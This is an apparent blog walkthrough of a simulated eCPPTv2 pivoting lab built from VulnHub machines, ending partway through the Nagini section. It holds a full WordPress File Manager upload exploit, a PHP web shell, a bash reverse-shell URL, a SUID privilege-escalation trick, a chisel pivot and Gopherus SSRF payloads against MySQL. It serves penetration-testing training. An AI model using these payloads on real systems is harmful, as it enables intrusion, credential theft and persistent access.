---
layout: single
title:  eCPPTv2 Simulation
excerpt: "This time we will perform a simulation of the eCPPTv2 exam, in which we will have to compromise an entire network of computers using **Pivoting**, all in a local environment using VMware. "
date: 2025-07-14
classes: wide
header:
  teaser: /assets/images/2024-08-17-eCPPTv2-simulation/certificate-eCPPTv2.png
  teaser_home_page: true
  icon: # /assets/images/vulnhub-logo.png
categories:
  - vulnhub
  - Certification
  - Pivoting
  - eCPPTv2
tags:
  - john
  - WordPress
  - wpscan
  - scripting
  - Vmware
  - Buffer Over Flow
  - mysql
  - SSRF
  - BurpSuite
  - Privilege Escalation
  - Python3
---

![](/assets/images/2024-08-17-eCPPTv2-simulation/certificate-eCPPTv2.png)

This time we will perform a simulation of the eCPPTv2 exam, in which we will have to compromise an entire network of computers using **Pivoting**, all in a local environment using VMware. 

Machines links:

1. [Aragog](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)
2. [Nagini](https://www.vulnhub.com/entry/harrypotter-nagini,689/)
3. [Fawkes](https://www.vulnhub.com/entry/harrypotter-fawkes,686/)
4. [Matrix 1](https://www.vulnhub.com/entry/matrix-1,259/)
5. [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)

We start with the configuration:

1. Network Configuration => Vmware > Edit > Virtual Network Editor
We have to add new network interfaces to be able to create the subnets, below you will see an image with the ones you have to create and the IP addresses:

![](/assets/images/2024-08-17-eCPPTv2-simulation/network_editor.png)

2. To each machine we have to add it to a network so that the networks can be seen and separated, for this I will attach an image of the configuration of each machine:

Aragog

![](/assets/images/2024-08-17-eCPPTv2-simulation/aragog_network.png)

Nagini

![](/assets/images/2024-08-17-eCPPTv2-simulation/Nagini_network.png)

Fawkes

![](/assets/images/2024-08-17-eCPPTv2-simulation/fawkes-network.png)

Matrix

![](/assets/images/2024-08-17-eCPPTv2-simulation/matrix-network.png)

Brainpan

![](/assets/images/2024-08-17-eCPPTv2-simulation/brainpan-network.png)

After performing this configuration in **Vmware** we have to go to each machine except the **Matrix** **Brainpan** and when entering the **group** of the machine, press **e** to enter the following interface and enter the following command to grant us a root password

![](/assets/images/2024-08-17-eCPPTv2-simulation/rw_init.png)

Then we have to do the following:

```
nano /etc/network/interfaces
```

Fawkes

![](/assets/images/2024-08-17-eCPPTv2-simulation/interfaces-conf.png)

Nagini, Aragog

![](/assets/images/2024-08-17-eCPPTv2-simulation/interfaces-whit-two-interface.png)

So, with all the machines except the ones mentioned above, we finally reboot them and we can start compromising the machines.

# Aragog

## ScanReport

```
# Nmap 7.94SVN scan initiated Sat Aug 17 12:38:26 2024 as: nmap -sCV -p22,80 -oN target 192.168.1.24
Nmap scan report for 192.168.1.24
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:76:EA:DC (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 17 12:38:33 2024 -- 1 IP address (1 host up) scanned in 6.86 seconds
```

Now we did an exhaustive scan on the web but as we can see there is nothing but an image so we have done some fuzzing to find directories inside the web:

```
gobuster dir -u http://192.168.1.31 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.31
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://192.168.1.31/blog/]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.31/javascript/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

```
gobuster dir -u http://192.168.1.31/blog -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -x php,php.bak -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.31/blog
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php.bak,php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php/                (Status: 403) [Size: 277]
/index.php/           (Status: 301) [Size: 0] [--> http://192.168.1.31/blog/]
/wp-content/          (Status: 403) [Size: 277]
/wp-login.php/        (Status: 200) [Size: 3328]
/wp-includes/         (Status: 403) [Size: 277]
/wp-trackback.php/    (Status: 200) [Size: 135]
/wp-admin/            (Status: 302) [Size: 0] [--> http://wordpress.aragog.hogwarts/blog/wp-login.php?redirect_to=http%3A%2F%2F192.168.1.31%2Fblog%2Fwp-admin%2F&reauth=1]
/xmlrpc.php/          (Status: 405) [Size: 42]
/.php/                (Status: 403) [Size: 277]
/wp-signup.php/       (Status: 302) [Size: 0] [--> http://wordpress.aragog.hogwarts/blog/wp-login.php?action=register]
Progress: 474226 / 661683 (71.67%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 475251 / 661683 (71.82%)
===============================================================
Finished
===============================================================
```

If we try to get into the paths that **gobuster** has loaded, it won't let us, so we have to add **wordpress.aragog.hogwarts** to our **/etc/hosts**.

```
192.168.1.24 wordpress.aragog.hogwarts 
```

At this point to go faster we will use **wpscan** to search for vulnerabilities in this wordpress, remember that you will need a valid token from the wpscan site.

In the wpscan report we can see a lot of information and vulnerabilities but we will focus on **Unanauthenticated Arbitrary File Upload leading to RCE**, because it is the most critical one since being able to execute commands without authentication is quite critical.

```
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
```

In the first link we can see the exploit for this vulnerability, this is the exploit:

```

import argparse
import sys

import requests  # python-requests, eg. apt-get install python3-requests


def exploit(url):
    full_url = f'{url}/wp-content/plugins/wp-file-manager/lib/php/' + \
               'connector.minimal.php'

    # Entry point is lib/php/connector.minimal.php, which then loads
    # elFinderConnector from file `lib/php/elFinderConnector.class.php`,
    # which then processes our input
    #
    data = {
        'cmd': 'upload',
        'target': 'l1_',
        'debug': 1,
    }
    files = {
        'upload[0]': open('payload.php', 'rb'),
    }

    print(f"Just do it... URL: {full_url}")
    res = requests.post(full_url, data=data, files=files, verify=False)
    print(res.status_code)
    if res.status_code == requests.codes.ok:
        print("Success!?")
        d = res.json()
        p = d.get('added', [])[0].get('url')
        print(f'{url}{p}')
    else:
        print("fail")
        return 1
    return 0


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help="Full URL to the WordPress site " +
                                    "with vulnerable plugin")
    args = parser.parse_args()

    if not args.url.startswith('http'):
        raise ValueError(f"Invalid URL: {args.url}")

    return exploit(args.url)


if __name__ == '__main__':
    sys.exit(main())

```

First we have to create a payload.php file with malicious php script so that we can execute commands.

```
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

Now we can run exploit to put malicious payload.php file on wordpress server and then execute system commands.

```
python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
Just do it... URL: http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
200
Success!?
http://wordpress.aragog.hogwarts/blog//blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php
```

Now we can try to execute system commands in the following path:

```
http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami
```

![](/assets/images/2024-08-17-eCPPTv2-simulation/command-exectution.png)

Finally, we can run the bash command to obtain revershell

```
http://wordpress.aragog.hogwarts/blog//wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.21/443%200%3E%261%22
```

Result:

```
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.31] 46324
bash: cannot set terminal process group (743): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
www-data
```
At this point we have to do a tty treatment because this shell is limited and not comfortable.

link to learn: [tty tratament](https://invertebr4do.github.io/tratamiento-de-tty/)

## Got Root

At this point we are **www-data** user, in this case as wordpress is running it is interesting to look for the **wp-config.php** file because it usually has the credentials for the database.

```
if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/userna$
    exit(1);
}
```

But in this case no credentials were found but a path that can have credentials.

```
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>
```

At this point try to connect in mysql database:

```
mysql -q root                
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
bash-5.0$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'database' at line 1
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
bash-5.0$ mysql -uroot -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 44
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.000 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
13 rows in set (0.000 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.000 sec)
```
At this point we can try carack the password encrypted

```
john -w:/usr/share/wordlists/rockyou.txt hash.txt

john hash.txt --show
?:password123

1 password hash cracked, 0 left
```

```
bash-5.0$ su hagrid98
Password: 
bash-5.0$ whoami
hagrid98
bash-5.0$ 
```

Now we are hagrid98 and we finally have to find a way to be root. After some time searching with different methods to find something that can expolotar we see that there is something unusual.

```
bash-5.0$ find / -writable 2> /dev/null 

/proc/1469/setgroups
/proc/1469/timerslack_ns
/opt/.backup.sh
```

/opt/.backup.sh

```
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
```

This script creates a recursive copy of the directory **/usr/share/wordpress/wp-content/uploads/** in /tmp, then this script is getionationed by root. To excalate our privileges we can try to modify this script since we have write permissions.

```
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
chmod u+s /bin/bash
```

Then we wait until we see the permission of the **/bin/bash** change

```
watch -n 1 ls -la /bin/bash
```

After some time we can see that you already have the SUID permit.

```
bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bash-5.0$ 
```

```
bash -p

bash-5.0# whoami
root
bash-5.0# cat /root/
.bash_history     .bashrc           .gnupg/           horcrux2.txt      hostDiscovery.sh  .local/           .profile          .selected_editor  .ssh/             
bash-5.0# cat /root/horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

bash-5.0# 

```

# Nagini

At this point we only have access on the Aragog machine but we don't see the Nagini machine. To get this visibility we need to add some configurations, we need to install **chisel** you can find this binary in github.

Before doing anything else, it is important to run the bash script that we have created to analyze the computers that are on the other interface:

Source code

```
#!/bin/bash

## SIGINT

cleanup(){

        echo -e "\nBYE..\n"
        exit 1
}


trap cleanup SIGINT


## Taget 10.10.0.128

echo -e "\nScanning in the network...\n"

for ipAddress in $(seq 1 254); do
        for port in 21 22 80 443 445 8080; do

                timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$ipAddress/$port" &> /dev/null && echo "[+] Host: 10.10.0.$ipAddress - PORT $port - OPEN" &
        done
done; wait

echo -e "\n All Already :)\n"
```

Output

```
root@Aragog:~# bash hostDiscovery.sh 

Scanning in the network...

[+] Host: 10.10.0.1 - PORT 445 - OPEN
[+] Host: 10.10.0.128 - PORT 22 - OPEN
[+] Host: 10.10.0.128 - PORT 80 - OPEN
[+] Host: 10.10.0.129 - PORT 22 - OPEN
[+] Host: 10.10.0.129 - PORT 80 - OPEN

 All Already :)
```

On our machine we need to run a chisel server on any port:

```
./chisel server --reverse -p 1234
2024/08/25 18:33:50 server: Reverse tunnelling enabled
2024/08/25 18:33:50 server: Fingerprint RbT7IHdkftHEbZ5lMa1fX/lYwtknGkM5SjVK6JjTh0M=
2024/08/25 18:33:50 server: Listening on http://0.0.0.0:1234
2024/08/25 18:33:53 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

We use **--reverse** to access the clinet machine.

On client machine:

```
root@Aragog:~# ./chisel client 192.168.1.21:1234 R:socks
2024/08/25 22:03:53 client: Connecting to ws://192.168.1.21:1234
2024/08/25 22:03:53 client: Connected (Latency 675.044µs)

```

we use **R:socks** to create a reverse SOCKS5 tunnel. The **R** indicates that it is a reverse tunnel, i.e. the server accesses through the tunnel to the resources available on the client.

Two important things: 

The first one when we have access on the machine we need to put our public key in the file **~/.ssh/authorized_keys**, to always have access on the machine.

The second thing is when we need to transfer binary or casual files we can use **scp** , as well:

```
scp text.txt root@192.168.1.31:/tmp/

text.txt                                                                                                                                              100%    5     3.9KB/s   00:00 
```

When we receive the connection, we are ready for the next step, the configuration in the **/etc/proxychains.conf** file. We need the add the following:

```
# dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
strict_chain 

```

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050

# socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```

## ScanReport

To check if we have connection on the other interface we can try to do nmap scan:

```
seq 1 65536 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -T5 -n -v 10.10.0.128 2>&1 | grep "tcp open"
22/tcp open  ssh
80/tcp open  http

```

When we make nmap scan using proxychains we need to have two parameters for it to work = > -sT(TCP scan), -Pn(No host discovery). We finally use xargs to have 500 threads for more speed

To view the web server we need to do the following:

![](/assets/images/2024-08-17-eCPPTv2-simulation/foxyproxy-nagini.png)

We can see the Nagini web server:

![](/assets/images/2024-08-17-eCPPTv2-simulation/web-server-nagini.png)


At this point we will use **gobuster** for fuzzing:

```
gobuster dir -u http://10.10.0.129/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,php --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.129/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 311] [--> http://10.10.0.129/joomla/]
/.php                 (Status: 403) [Size: 276]
Progress: 159687 / 661683 (24.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 160792 / 661683 (24.30%)
```

We can see **note.txt**, let's take a look:

![](/assets/images/2024-08-17-eCPPTv2-simulation/note-txt.png)

Then to see this announcements we will need to install **quiche**, like this:

```
1- git clone --recursive https://github.com/cloudflare/quiche 
2- cd quiche 
3- git checkout -b FixHTTP3 a22bb4b3cb474425764cb7d7b6abd112824994a2 
4- cargo build --examples 
```

Luego tenemos que cambiar **./cliente de chisel** para ver el anuncio en el servidor web http3, like this:

```
./chisel client 192.168.1.21:1234 R:socks R:443:10.10.0.129:443/udp
2024/08/26 00:04:04 client: Connecting to ws://192.168.1.21:1234
2024/08/26 00:04:04 client: Connected (Latency 554.118µs)

```

To bring us the port 443 of the Nagini machine. Finally we can execute the following command:

```
./target/debug/examples/http3-client https://127.0.0.1
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```

Something it tells us is that there is a hidden directory, we visit this directorio and see the following:

![](/assets/images/2024-08-17-eCPPTv2-simulation/ssrf-server.png)

Now the first thing we think about is to try to make the request on the localhost or on the Aragog machine, and it worked:

![](/assets/images/2024-08-17-eCPPTv2-simulation/ssrf-test.png)

It looks like we are dealing with an **SSRF(Server Side Request Forgery)**, at this point we try to upload a malicious php file, but it does not work, the php script is not executed.

![](/assets/images/2024-08-17-eCPPTv2-simulation/php-noexecute.png)

We have seen before that there is a **joomla** so we are going to fuzz it.

```
gobuster dir -u http://10.10.0.129/joomla/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x txt,php,php.bak --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.129/joomla/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,php.bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 318] [--> http://10.10.0.129/joomla/images/]
/index.php            (Status: 200) [Size: 6653]
/media                (Status: 301) [Size: 317] [--> http://10.10.0.129/joomla/media/]
/templates            (Status: 301) [Size: 321] [--> http://10.10.0.129/joomla/templates/]
/modules              (Status: 301) [Size: 319] [--> http://10.10.0.129/joomla/modules/]
/bin                  (Status: 301) [Size: 315] [--> http://10.10.0.129/joomla/bin/]
/plugins              (Status: 301) [Size: 319] [--> http://10.10.0.129/joomla/plugins/]
/includes             (Status: 301) [Size: 320] [--> http://10.10.0.129/joomla/includes/]
/language             (Status: 301) [Size: 320] [--> http://10.10.0.129/joomla/language/]
/README.txt           (Status: 200) [Size: 4793]
/components           (Status: 301) [Size: 322] [--> http://10.10.0.129/joomla/components/]
/cache                (Status: 301) [Size: 317] [--> http://10.10.0.129/joomla/cache/]
/libraries            (Status: 301) [Size: 321] [--> http://10.10.0.129/joomla/libraries/]
/robots.txt           (Status: 200) [Size: 748]
/tmp                  (Status: 301) [Size: 315] [--> http://10.10.0.129/joomla/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 319] [--> http://10.10.0.129/joomla/layouts/]
/administrator        (Status: 301) [Size: 325] [--> http://10.10.0.129/joomla/administrator/]
/configuration.php.bak (Status: 200) [Size: 1978]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 3407]
/cli                  (Status: 301) [Size: 315] [--> http://10.10.0.129/joomla/cli/]
Progress: 155345 / 5095336 (3.05%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 155715 / 5095336 (3.06%)
```

We have found configuration.php.bak, let's have a look at it.

```
   1   │ <?php
   2   │ class JConfig {
   3   │     public $offline = '0';
   4   │     public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
   5   │     public $display_offline_message = '1';
   6   │     public $offline_image = '';
   7   │     public $sitename = 'Joomla CMS';
   8   │     public $editor = 'tinymce';
   9   │     public $captcha = '0';
  10   │     public $list_limit = '20';
  11   │     public $access = '1';
  12   │     public $debug = '0';
  13   │     public $debug_lang = '0';
  14   │     public $debug_lang_const = '1';
  15   │     public $dbtype = 'mysqli';
  16   │     public $host = 'localhost';
  17   │     public $user = 'goblin';
  18   │     public $password = '';
  19   │     public $db = 'joomla';
  20   │     public $dbprefix = 'joomla_';
  21   │     public $live_site = '';
  22   │     public $secret = 'ILhwP6HTYKcN7qMh';
  23   │     public $gzip = '0';
  24   │     public $error_reporting = 'default';
  25   │     public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
  26   │     public $ftp_host = '';
  27   │     public $ftp_port = '';
  28   │     public $ftp_user = '';
  29   │     public $ftp_pass = '';
  30   │     public $ftp_root = '';
  31   │     public $ftp_enable = '0';
  32   │     public $offset = 'UTC';
  33   │     public $mailonline = '1';
  34   │     public $mailer = 'mail';
  35   │     public $mailfrom = 'site_admin@nagini.hogwarts';
  36   │     public $fromname = 'Joomla CMS';
  37   │     public $sendmail = '/usr/sbin/sendmail';
  38   │     public $smtpauth = '0';
  39   │     public $smtpuser = '';
  40   │     public $smtppass = '';
  41   │     public $smtphost = 'localhost';
  42   │     public $smtpsecure = 'none';
  43   │     public $smtpport = '25';
  44   │     public $caching = '0';
  45   │     public $cache_handler = 'file';
  46   │     public $cachetime = '15';
  47   │     public $cache_platformprefix = '0';
  48   │     public $MetaDesc = '';
  49   │     public $MetaKeys = '';
  50   │     public $MetaTitle = '1';
  51   │     public $MetaAuthor = '1';
  52   │     public $MetaVersion = '0';
  53   │     public $robots = '';
  54   │     public $sef = '1';
  55   │     public $sef_rewrite = '0';
  56   │     public $sef_suffix = '0';
  57   │     public $unicodeslugs = '0';
  58   │     public $feed_limit = '10';
  59   │     public $feed_email = 'none';
  60   │     public $log_path = '/var/www/html/joomla/administrator/logs';
  61   │     public $tmp_path = '/var/www/html/joomla/tmp';
  62   │     public $lifetime = '15';
  63   │     public $session_handler = 'database';
  64   │     public $shared_session = '0';
  65   │ }
```

We found user **goblin** in database.

At this point we have the SSRF vulnerability but we cannot execute the malicious content we uploaded. Now comes into play **gopherus**, we can get this script on github. 

Gopherus Description:

If you know a place which is SSRF vulnerable then, this tool will help you to generate Gopher payload for exploiting SSRF (Server Side Request Forgery) and gaining RCE (Remote Code Execution).

This tool will be used to view the contents of the database, as follows:

```
❯ python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------

```

If we enter this query in the field SSRF vulnarable and reload several times we can see the mysql output.

![](/assets/images/2024-08-17-eCPPTv2-simulation/first-query.png)


At this point we are interested in viewing joomla credentials.

```
❯ python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; describe joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%64%65%73%63%72%69%62%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

```
python2.7 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
